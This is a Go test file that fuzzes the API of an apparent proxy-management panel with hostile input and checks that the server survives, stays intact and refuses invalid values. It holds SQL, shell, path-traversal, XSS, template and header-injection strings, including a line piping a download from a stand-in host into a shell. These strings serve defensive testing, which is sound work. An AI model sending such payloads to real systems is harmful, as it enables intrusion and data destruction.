package api

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

// hostile is what someone who means harm, or a broken client, puts into a
// field: text that is SQL, shell, a path, markup or a template to something
// that takes it for one; text that is too long or not text; numbers that
// are not in any range; and values of the wrong kind altogether.
var hostileText = []string{
	`'; DROP TABLE clients;--`, `" OR "1"="1`, `1; DELETE FROM users WHERE 1=1`, `admin'--`, `') UNION SELECT password_hash FROM users--`,
	"$(id)", "`id`", "; rm -rf /", "| cat /etc/passwd", "&& curl evil.example | sh", "-oProxyCommand=id", "--privileged",
	"../../../../etc/passwd", "/etc/shadow", `..\..\windows\system32`, "file:///etc/passwd",
	"<script>alert(1)</script>", `"><img src=x onerror=alert(1)>`, "javascript:alert(1)", "{{7*7}}", "${7*7}", "%00", "%0d%0aSet-Cookie:x=1",
	"a\x00b", "line1\nline2", "a\r\nb", "‮gnp.exe", "\t", " ", "",
	"🙂🙂🙂", strings.Repeat("A", 300), strings.Repeat("A", 70000),
}

var hostileOther = []any{-1, 0, 65536, 99999999999, -99999999999, 1.5, 1e300, true, nil, []any{}, []any{1, 2}, map[string]any{}, map[string]any{"a": 1}}

type call struct {
	method, path string
	body         map[string]any
}

// Every field of every request that changes something, given every hostile
// value in turn. Whatever the answer is, it is an answer: the server never
// fails on input, and afterwards the database is whole, the administrator
// can still sign in and the configuration is still one.
func TestHostileInputNeverBreaksTheServer(t *testing.T) {
	e := newTestEnv(t)
	h := map[string]string{csrfHeader: e.loginFresh(t)}
	id := func(m map[string]any) string { return fmt.Sprint(int(m["id"].(float64))) }
	_, inb0 := e.do(t, "POST", "/api/inbounds", map[string]any{"protocol": "shadowsocks", "name": "SS", "port": 8388}, h)
	_, cl := e.do(t, "POST", "/api/clients", map[string]any{"name": "Anna"}, h)
	_, link := e.do(t, "POST", "/api/nodes", map[string]any{"kind": "link", "link": "trojan://secret@exit.example.com:443?sni=exit.example.com#Rented"}, h)
	_, agentNode := e.do(t, "POST", "/api/nodes", map[string]any{"kind": "agent", "name": "Exit", "address": "203.0.113.20", "isExit": true}, h)
	_, list := e.do(t, "POST", "/api/routing/lists", map[string]any{"kind": "manual", "name": "Banks", "content": "bank.example"}, h)
	_, rule := e.do(t, "POST", "/api/routing/rules", map[string]any{"listId": list["id"], "action": "block"}, h)
	_, usr := e.do(t, "POST", "/api/users", map[string]any{"username": "olga", "role": "viewer"}, h)
	userID := id(usr["user"].(map[string]any))

	calls := []call{
		{"POST", "/api/inbounds", map[string]any{"protocol": "vless", "name": "V", "port": 8443, "enabled": true, "realityServer": "www.example.com", "realityServerPort": 443, "serverName": "www.example.com", "tlsMode": "", "strictTls": false, "certificatePath": "", "keyPath": "", "masqueradeUrl": "", "obfs": false}},
		{"POST", "/api/inbounds", map[string]any{"protocol": "hysteria2", "name": "H", "port": 8444, "serverName": "h.example.com", "tlsMode": "private", "masqueradeUrl": "https://www.example.com", "obfs": true}},
		{"POST", "/api/inbounds", map[string]any{"protocol": "trojan", "name": "T", "port": 8445, "serverName": "t.example.com", "tlsMode": "files", "certificatePath": "/etc/ssl/cert.pem", "keyPath": "/etc/ssl/key.pem"}},
		{"PUT", "/api/inbounds/" + id(inb0), map[string]any{"name": "SS", "port": 8388, "enabled": true}},
		{"POST", "/api/inbounds/suggest", map[string]any{"protocol": "vless", "domain": "example.com"}},
		{"POST", "/api/clients", map[string]any{"name": "Boris", "enabled": true, "trafficLimit": 1000, "expiresAt": "2030-01-01T00:00:00Z", "note": "n", "exitId": nil}},
		{"PUT", "/api/clients/" + id(cl), map[string]any{"name": "Anna", "enabled": true, "trafficLimit": 0, "expiresAt": nil, "note": "", "exitId": nil}},
		{"POST", "/api/nodes", map[string]any{"kind": "agent", "name": "N", "address": "203.0.113.30", "isExit": true, "isEntry": false, "enabled": true, "hopPort": 8443, "agentPort": 2056, "link": "", "standby": false}},
		{"POST", "/api/nodes", map[string]any{"kind": "link", "name": "L", "link": "trojan://secret@exit2.example.com:443?sni=exit2.example.com#Two"}},
		{"PUT", "/api/nodes/" + id(agentNode), map[string]any{"name": "Exit", "isExit": true, "isEntry": false, "enabled": true, "hopPort": 8443, "agentPort": 2056, "standby": false}},
		{"PUT", "/api/nodes/" + id(link) + "/location", map[string]any{"location": map[string]any{"lat": 52.3, "lon": 4.9}}},
		{"PUT", "/api/topology/location", map[string]any{"location": map[string]any{"lat": 52.3, "lon": 4.9}}},
		{"POST", "/api/routing/lists", map[string]any{"kind": "manual", "name": "Own", "url": "", "content": "a.example\n198.51.100.0/24"}},
		{"PUT", "/api/routing/lists/" + id(list), map[string]any{"kind": "manual", "name": "Banks", "url": "", "content": "bank.example"}},
		{"POST", "/api/routing/rules", map[string]any{"listId": list["id"], "action": "direct", "nodeId": nil, "enabled": true}},
		{"PUT", "/api/routing/rules/" + id(rule), map[string]any{"listId": list["id"], "action": "block", "nodeId": nil, "enabled": true}},
		{"PUT", "/api/routing/rules/order", map[string]any{"ids": []any{rule["id"]}}},
		{"PUT", "/api/routing/default", map[string]any{"action": "direct", "nodeId": nil}},
		{"PUT", "/api/settings", map[string]any{"publicHost": "203.0.113.5", "subscriptionBaseUrl": "", "subscriptionPort": 0, "acmeEmail": "a@example.com", "acmeChallenge": "http", "acmeHttpPort": 8080}},
		{"PUT", "/api/panel-access", map[string]any{"enabled": false, "port": 443, "mode": "acme", "certificate": nil, "key": nil, "decoy": nil}},
		{"POST", "/api/setup/basics", map[string]any{"publicHost": "203.0.113.5", "domain": ""}},
		{"PUT", "/api/sso", map[string]any{"enabled": false, "name": "SSO", "issuer": "https://id.example.com", "clientId": "c", "clientSecret": "s", "scopes": "openid", "groupsClaim": "groups", "adminGroup": "a", "operatorGroup": "", "viewerGroup": "", "defaultRole": ""}},
		{"POST", "/api/users", map[string]any{"username": "petr", "role": "viewer"}},
		{"PUT", "/api/users/" + userID, map[string]any{"role": "viewer", "disabled": false}},
		{"PUT", "/api/update", map[string]any{"auto": false, "weekday": -1, "minute": 180}},
		{"PUT", "/api/update/plan", map[string]any{"at": nil}},
	}
	n, accepted := 0, 0
	for _, c := range calls {
		for k := range c.body {
			var values []any
			for _, s := range hostileText {
				values = append(values, s)
			}
			values = append(values, hostileOther...)
			for _, v := range values {
				body := map[string]any{}
				for a, b := range c.body {
					body[a] = b
				}
				body[k] = v
				resp, _ := e.do(t, c.method, c.path, body, h)
				n++
				if resp.StatusCode >= 500 {
					shown, _ := json.Marshal(v)
					t.Errorf("%s %s with %s = %.80s: the server answered %d", c.method, c.path, k, shown, resp.StatusCode)
				}
				if resp.StatusCode < 300 {
					accepted++
				}
			}
		}
	}
	t.Logf("%d requests, %d of them accepted", n, accepted)

	// What was accepted was stored as what it is. The tables that the SQL
	// in those values names are all still there, with their rows.
	for table, min := range map[string]int{"users": 2, "clients": 1, "inbounds": 1, "nodes": 2, "route_lists": 1, "sessions": 1, "settings": 1} {
		count, err := e.store.CountRows(t.Context(), table)
		if err != nil || count < min {
			t.Errorf("table %s after the hostile input: %d rows, %v", table, count, err)
		}
	}
	if ok, err := e.store.IntegrityCheck(t.Context()); err != nil || !ok {
		t.Errorf("the database does not pass its integrity check: %v", err)
	}
	fresh := &testEnv{srv: e.srv, client: e.browser()}
	if resp, _ := fresh.do(t, "POST", "/api/auth/login", map[string]string{"username": "admin", "password": "a-much-better-password"}, nil); resp.StatusCode != 200 {
		t.Errorf("the administrator cannot sign in any more: %d", resp.StatusCode)
	}
	var cfg map[string]any
	if code := e.getJSON(t, "/api/singbox/config", &cfg); code != 200 {
		t.Errorf("the configuration cannot be read any more: %d", code)
	}
	// A name that is SQL is a name.
	sql := "Robert'); DROP TABLE clients;--"
	resp, made := e.do(t, "POST", "/api/clients", map[string]any{"name": sql, "note": "\" OR \"1\"=\"1"}, h)
	if resp.StatusCode != 201 || made["name"] != sql || made["note"] != "\" OR \"1\"=\"1" {
		t.Errorf("a name that is SQL: %d %v", resp.StatusCode, made)
	}
	found := false
	for _, c := range e.list(t, "/api/clients") {
		found = found || c["name"] == sql
	}
	if !found {
		t.Error("the client with the SQL name is not in the list")
	}
}

// What must be refused, field by field: numbers that are not in their
// range, addresses that are not addresses, names of files and links that
// reach where they should not, and identifiers that are not numbers.
func TestNonsenseIsRefused(t *testing.T) {
	e := newTestEnv(t)
	h := map[string]string{csrfHeader: e.loginFresh(t)}
	id := func(m map[string]any) string { return fmt.Sprint(int(m["id"].(float64))) }
	_, inb0 := e.do(t, "POST", "/api/inbounds", map[string]any{"protocol": "shadowsocks", "name": "SS", "port": 8388}, h)
	_, cl := e.do(t, "POST", "/api/clients", map[string]any{"name": "Anna"}, h)
	_, link := e.do(t, "POST", "/api/nodes", map[string]any{"kind": "link", "link": "trojan://secret@exit.example.com:443?sni=exit.example.com#Rented"}, h)
	_, agentNode := e.do(t, "POST", "/api/nodes", map[string]any{"kind": "agent", "name": "Exit", "address": "203.0.113.20", "isExit": true}, h)
	_, list := e.do(t, "POST", "/api/routing/lists", map[string]any{"kind": "manual", "name": "Banks", "content": "bank.example"}, h)
	_, rule := e.do(t, "POST", "/api/routing/rules", map[string]any{"listId": list["id"], "action": "block"}, h)
	_, usr := e.do(t, "POST", "/api/users", map[string]any{"username": "olga", "role": "viewer"}, h)
	userID := id(usr["user"].(map[string]any))

	_, _, _ = cl, agentNode, userID
	type bad struct {
		method, path string
		body         map[string]any
	}
	inb := func(over map[string]any) map[string]any {
		m := map[string]any{"protocol": "vless", "name": "V", "port": 8443, "realityServer": "www.example.com", "realityServerPort": 443}
		for k, v := range over {
			m[k] = v
		}
		return m
	}
	hy := func(over map[string]any) map[string]any {
		m := map[string]any{"protocol": "hysteria2", "name": "H", "port": 8444, "serverName": "h.example.com", "tlsMode": "private", "masqueradeUrl": "https://www.example.com"}
		for k, v := range over {
			m[k] = v
		}
		return m
	}
	node := func(over map[string]any) map[string]any {
		m := map[string]any{"kind": "agent", "name": "N", "address": "203.0.113.30", "isExit": true}
		for k, v := range over {
			m[k] = v
		}
		return m
	}
	settings := func(over map[string]any) map[string]any {
		m := map[string]any{"publicHost": "203.0.113.5", "subscriptionBaseUrl": "", "subscriptionPort": 0, "acmeEmail": "a@example.com", "acmeChallenge": "http", "acmeHttpPort": 8080}
		for k, v := range over {
			m[k] = v
		}
		return m
	}
	sso := func(over map[string]any) map[string]any {
		m := map[string]any{"enabled": false, "name": "SSO", "issuer": "https://id.example.com", "clientId": "c", "scopes": "openid", "groupsClaim": "groups", "adminGroup": "a", "operatorGroup": "", "viewerGroup": "", "defaultRole": ""}
		for k, v := range over {
			m[k] = v
		}
		return m
	}
	var cases []bad
	add := func(method, path string, bodies ...map[string]any) {
		for _, b := range bodies {
			cases = append(cases, bad{method, path, b})
		}
	}
	for _, port := range []any{-1, 0, 65536, 99999999999, 1.5, "443"} {
		add("POST", "/api/inbounds", inb(map[string]any{"port": port}))
		add("PUT", "/api/inbounds/"+id(inb0), map[string]any{"name": "SS", "port": port})
	}
	for _, port := range []any{-1, 65536, 1.5, "443"} {
		add("POST", "/api/inbounds", inb(map[string]any{"realityServerPort": port}))
		add("POST", "/api/nodes", node(map[string]any{"hopPort": port}), node(map[string]any{"agentPort": port}))
		add("PUT", "/api/settings", settings(map[string]any{"subscriptionPort": port}), settings(map[string]any{"acmeHttpPort": port}))
	}
	for _, host := range []string{"a b", "evil.example/path", "x\ny", "$(id)", "-oProxyCommand=id", "http://x", "user@host", "host;id", "..", "a..b", strings.Repeat("a", 300) + ".example"} {
		add("POST", "/api/inbounds", inb(map[string]any{"realityServer": host}), hy(map[string]any{"serverName": host}))
		add("POST", "/api/nodes", node(map[string]any{"address": host}))
		add("PUT", "/api/settings", settings(map[string]any{"publicHost": host}))
		add("POST", "/api/setup/basics", map[string]any{"publicHost": host, "domain": ""}, map[string]any{"publicHost": "203.0.113.5", "domain": host})
	}
	for _, u := range []string{"file:///etc/passwd", "javascript:alert(1)", "ftp://example.com/x", "//example.com", "https://", "https://user:pw@example.com", "gopher://example.com", "data:text/html,x"} {
		add("POST", "/api/inbounds", hy(map[string]any{"masqueradeUrl": u}))
		add("POST", "/api/routing/lists", map[string]any{"kind": "remote", "name": "R", "url": u})
		add("PUT", "/api/settings", settings(map[string]any{"subscriptionBaseUrl": u}))
		add("PUT", "/api/panel-access", map[string]any{"enabled": false, "port": 443, "mode": "acme", "decoy": u})
		add("PUT", "/api/sso", sso(map[string]any{"issuer": u}))
	}
	for _, path := range []string{"../../etc/passwd", "relative/cert.pem", "/etc/../etc/shadow", "cert.pem\x00.txt", ""} {
		add("POST", "/api/inbounds", map[string]any{"protocol": "trojan", "name": "T", "port": 8445, "serverName": "t.example.com", "tlsMode": "files", "certificatePath": path, "keyPath": "/etc/ssl/key.pem"})
	}
	for _, name := range []string{"", " ", "a\nb", "a\x00b", "a\u202eb", strings.Repeat("n", 65)} {
		// A connection may go without a name: it is then called by its
		// protocol and port.
		if strings.TrimSpace(name) != "" {
			add("POST", "/api/inbounds", inb(map[string]any{"name": name}))
		}
		add("POST", "/api/clients", map[string]any{"name": name})
		add("POST", "/api/nodes", node(map[string]any{"name": name}))
		add("POST", "/api/routing/lists", map[string]any{"kind": "manual", "name": name, "content": "a.example"})
	}
	add("POST", "/api/clients",
		map[string]any{"name": "x", "trafficLimit": -1}, map[string]any{"name": "x", "trafficLimit": 1.5}, map[string]any{"name": "x", "expiresAt": "tomorrow"},
		map[string]any{"name": "x", "expiresAt": 12345}, map[string]any{"name": "x", "exitId": 99999}, map[string]any{"name": "x", "exitId": -1},
		map[string]any{"name": "x", "note": strings.Repeat("n", 501)}, map[string]any{"name": "x", "note": "a\x00b"}, map[string]any{"name": "x", "unknown": 1})
	add("POST", "/api/nodes", node(map[string]any{"kind": "root"}), map[string]any{"kind": "link", "link": "javascript:alert(1)"}, map[string]any{"kind": "link", "link": "file:///etc/passwd"}, map[string]any{"kind": "link", "link": ""})
	for _, loc := range []map[string]any{{"lat": 91, "lon": 0}, {"lat": -91, "lon": 0}, {"lat": 0, "lon": 181}, {"lat": 0, "lon": -181}, {"lat": "52", "lon": 4}} {
		add("PUT", "/api/topology/location", map[string]any{"location": loc})
		add("PUT", "/api/nodes/"+id(link)+"/location", map[string]any{"location": loc})
	}
	add("POST", "/api/routing/lists", map[string]any{"kind": "sql", "name": "K", "content": "a.example"}, map[string]any{"kind": "manual", "name": "E", "content": ""}, map[string]any{"kind": "remote", "name": "E", "url": ""})
	add("POST", "/api/routing/rules",
		map[string]any{"listId": list["id"], "action": "drop table"}, map[string]any{"listId": 0, "action": "block"}, map[string]any{"listId": -1, "action": "block"},
		map[string]any{"listId": 99999, "action": "block"}, map[string]any{"listId": list["id"], "action": "node", "nodeId": 99999}, map[string]any{"listId": list["id"], "action": "node", "nodeId": -1},
		map[string]any{"listId": list["id"], "action": "node"}, map[string]any{"listId": "1 OR 1=1", "action": "block"})
	add("PUT", "/api/routing/rules/order", map[string]any{"ids": []any{-1}}, map[string]any{"ids": []any{99999}}, map[string]any{"ids": []any{rule["id"], rule["id"]}}, map[string]any{"ids": []any{}}, map[string]any{"ids": "1"})
	add("PUT", "/api/routing/default", map[string]any{"action": "x"}, map[string]any{"action": "node", "nodeId": -1}, map[string]any{"action": "node", "nodeId": 99999}, map[string]any{"action": "node"})
	add("PUT", "/api/settings", settings(map[string]any{"acmeEmail": "not an address"}), settings(map[string]any{"acmeEmail": "a@b.example\nBcc: x@y.example"}), settings(map[string]any{"acmeChallenge": "dns"}))
	add("PUT", "/api/sso", sso(map[string]any{"defaultRole": "root"}), sso(map[string]any{"adminGroup": "a\nb"}), sso(map[string]any{"clientId": strings.Repeat("c", 300)}), sso(map[string]any{"name": "a\x00b"}), sso(map[string]any{"scopes": "profile"}), sso(map[string]any{"issuer": "http://idp.example.com"}))
	add("POST", "/api/users", map[string]any{"username": "a b", "role": "viewer"}, map[string]any{"username": "x", "role": "root"}, map[string]any{"username": "o'brien", "role": "viewer"}, map[string]any{"username": "sso:abc", "role": "viewer"}, map[string]any{"username": strings.Repeat("u", 65), "role": "viewer"})
	add("PUT", "/api/update", map[string]any{"auto": true, "weekday": 7, "minute": 0}, map[string]any{"auto": true, "weekday": -2, "minute": 0}, map[string]any{"auto": true, "weekday": 0, "minute": -1}, map[string]any{"auto": true, "weekday": 0, "minute": 1440}, map[string]any{"auto": "yes", "weekday": 0, "minute": 0})
	add("PUT", "/api/update/plan", map[string]any{"at": "soon"}, map[string]any{"at": "2000-01-01T00:00:00Z"}, map[string]any{"at": 5})

	for _, c := range cases {
		resp, body := e.do(t, c.method, c.path, c.body, h)
		if resp.StatusCode != 400 {
			shown, _ := json.Marshal(c.body)
			t.Errorf("%s %s %.200s: answered %d %v, should be refused", c.method, c.path, shown, resp.StatusCode, body)
		}
	}
	t.Logf("%d kinds of nonsense refused", len(cases))

	// An identifier is a number of something that exists.
	for _, bad := range []string{"abc", "-1", "0", "99999999999999999999999", "1%20OR%201=1", "1;DROP%20TABLE%20clients", "..%2F1", "1.5", "0x1"} {
		for _, path := range []string{"/api/clients/", "/api/inbounds/", "/api/nodes/", "/api/routing/lists/", "/api/routing/rules/", "/api/users/"} {
			for _, method := range []string{"PUT", "DELETE"} {
				resp, _ := e.do(t, method, path+bad, map[string]any{"name": "x"}, h)
				if resp.StatusCode != 404 && resp.StatusCode != 400 && resp.StatusCode != 405 {
					t.Errorf("%s %s%s: answered %d", method, path, bad, resp.StatusCode)
				}
			}
		}
	}
	// A form with one wrong field is refused whole: the right fields next
	// to it are not quietly kept.
	var before map[string]any
	e.getJSON(t, "/api/settings", &before)
	if resp, _ := e.do(t, "PUT", "/api/settings", settings(map[string]any{"publicHost": "198.51.100.77", "acmeEmail": "new@example.com", "subscriptionPort": 70000}), h); resp.StatusCode != 400 {
		t.Fatalf("a settings form with a bad port: %d", resp.StatusCode)
	}
	var after map[string]any
	e.getJSON(t, "/api/settings", &after)
	if after["publicHost"] != before["publicHost"] || after["acmeEmail"] != before["acmeEmail"] {
		t.Errorf("a refused settings form was half saved: address %v -> %v, email %v -> %v", before["publicHost"], after["publicHost"], before["acmeEmail"], after["acmeEmail"])
	}

	// Signing in takes nonsense as a wrong password, and repetition as a
	// reason to make the caller wait.
	stranger := &testEnv{srv: e.srv, client: e.browser()}
	for _, name := range []string{"admin'--", "' OR '1'='1", "admin\x00", strings.Repeat("a", 5000)} {
		if resp, _ := stranger.do(t, "POST", "/api/auth/login", map[string]any{"username": name, "password": "' OR '1'='1"}, nil); resp.StatusCode != 401 && resp.StatusCode != 429 {
			t.Errorf("signing in as %.20q: %d", name, resp.StatusCode)
		}
	}

	// And nothing came of any of it.
	if all := e.list(t, "/api/clients"); len(all) != 1 {
		t.Errorf("%d clients after the nonsense, there was one: %v", len(all), all)
	}
	for path, want := range map[string]int{"/api/nodes": 2, "/api/users": 2} {
		if all := e.list(t, path); len(all) != want {
			t.Errorf("%s: %d after the nonsense, there were %d: %v", path, len(all), want, all)
		}
	}
	if all := e.list(t, "/api/inbounds"); len(all) != 1 {
		t.Errorf("%d connections after the nonsense, there was one: %v", len(all), all)
	}
}
